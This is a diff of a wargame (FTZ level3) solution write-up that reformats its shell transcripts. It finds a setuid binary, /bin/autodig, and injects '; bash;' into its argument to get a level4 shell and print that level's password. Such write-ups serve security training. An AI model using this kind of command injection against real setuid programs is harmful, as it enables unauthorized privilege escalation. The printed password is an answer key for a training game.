@@ -42,21 +42,19 @@ more hints.
 
 ***
 
-`[level3@ftz level3]$ find / -name autodig 2>/dev/null`
-
+```
+[level3@ftz level3]$ find / -name autodig 2>/dev/null
 /bin/autodig
-
-`[level3@ftz level3]$ find / -user level4 -perm -4000 2>/dev/null`
-
+[level3@ftz level3]$ find / -user level4 -perm -4000 2>/dev/null
 /bin/autodig
-
-`[level3@ftz level3]$ ls -l /bin/autodig`
-
+[level3@ftz level3]$ ls -l /bin/autodig
 -rwsr-x---    1 level4   level3      12194 Aug 19  2014 /bin/autodig
+```
 
-`[level3@ftz level3]$ /bin/autodig "8.8.8.8 www.naver.com; bash;"`
-
-`[level4@ftz level3]$ my-pass`
+```
+[level3@ftz level3]$ /bin/autodig "8.8.8.8 www.naver.com; bash;"
+[level4@ftz level3]$ my-pass
 
 Level4 Password is "suck my brain".
+```
 
